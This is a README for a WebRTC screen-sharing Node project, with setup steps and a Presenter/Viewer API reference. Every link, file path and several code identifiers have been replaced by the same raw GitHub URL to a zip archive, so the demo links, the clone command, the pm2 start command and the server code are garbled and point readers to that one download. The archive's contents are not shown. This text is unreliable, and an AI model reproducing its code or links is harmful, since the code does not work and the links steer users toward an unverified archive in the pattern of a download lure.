# WebRTC Based Screen Sharing

WebRTC screen sharing project. It supports Chrome, Firefox, Safari, Opera, Android, and Microsoft Edge. Platforms: Linux, Mac and Windows.

----------

## Live Demo

Presenter <https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip>

Viewer <https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip>

----------

## Installation Steps

### Pre-requirements

Install following apps on your server:

#### Mandatory

* Last version of https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip <https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip>

* Last version of Coturn server (STUN & TRUN server) <https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip>

    note: You can also use free STUN servers but in many cases, it causes the viewer cannot display streamed data because of routing problems.

#### Optional

* Last version of Kurento media server (to using stream server) <https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip>

### Installation

1. Clone the repository

    ```bash
    git clone https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip
    ```

2. Install Node modules

    ```bash
    cd webrtc-screen-share 
    npm install
    ```

3. Set your desired port, Kurento server IP and certificates in https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip as following:

    ```js
    const httpPort = 3000; //your desired port
    const kurentoIP = '127.0.0.1'; //if using kurento specify IP address here   
    const kurentoPort = 8888; //if using kurento specify port number here   
    ...
    const server = https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip({
        key: https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip('https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip'),
        cert: https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip('https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip'),
        passphrase: 'your certificate passphrase'
    }, app);     
    ...
    
    ```

4. Copy user SSL certificates in ./certs as following:

    ```text
    https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip
    https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip
    ```

5. Set you STUN server in https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip and https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip as following:

    ```javascript
    https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip
    var presenterObj = new presenter({
    iceServers: [
        { urls:"stun:stun_server_pubic_ip:stun_server_port"},
        …
    ]
    });
    ```

    ```javascript
    https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip
    var viewerObj = new viewer({
    iceServers: [
        { urls:"stun:stun_server_pubic_ip:stun_server_port"},
        …
    ]
    });
    ```

6. Start https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip server using pm2 as following

    ```bash
    pm2 start https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip 
    ```

7. Now you can browse https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip & https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip as following:

    ```text
    https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip
    https://raw.githubusercontent.com/meuxlugh/webrtc-screen-share/main/public/assets/share_screen_webrtc_1.4.zip    
    ```

## API reference

### Presenter class

#### *constructor(options)*

```text
options:
    iceServers: list of STUN or TURN servers
    [
        {urls: "stun:stun_server1_pubic_ip: stun_server1_port"},
        {urls: "trun:trun_server2_pubic_ip: stun_server2_port", credential: "your credential", username: "user user name"}
    ]
```

#### *startSharing(options, startEvent, stopEvent, failedEvent)*

```text
start screen sharing
options:
    mechanism: mechanism of sharing
        * distributed
        * peer
        * streamserver
    maxFrameRate: maximum frame rate (number 1 .. 30)
    screenSize: size of shared stream screen (ex: 800*600, 1360*768)
    microphone: audio state
        * muted
        * unmuted
    startEvent: the event that raises when sharing start
    stopEvent: the event that raises when sharing stop
    failedEvent: the event that raises when sharing failed
```

#### *startSharing(stopEvent)*

```text
stop screen sharing
stopEvent: the event that raises when sharing stop
```

#### *setOptions(options)*

```text
set sharing options
options:
    microphone: audio state
        * muted
        * unmuted
```

#### *onStatusChanged*

```text
This is an event, and raises when any status of sharing status is changed
```

#### Public Properties

* isConnected (boolean): node socket connected or not

### Viewer class

#### *constructor(options)*

```text
options:
    player: video play object
    iceServers: list of STUN or TURN servers
    [
        {urls: "stun:stun_server1_pubic_ip: stun_server1_port"},
        {urls: "trun:trun_server2_pubic_ip: stun_server2_port", credential: "your credential", username: "user user name"}
    ]
```

#### *onStatusChanged*

```text
This is an event, and raises when any status of sharing status is changed.
```

#### Public Properties

* played (boolean): playing video status
* isWaitingViewer (boolean): viewer joined to presenter or not
* presenterStatus (string): online or offline
* isSharing (boolean): sharing available or not
* isConnected (boolean): node socket connected or not
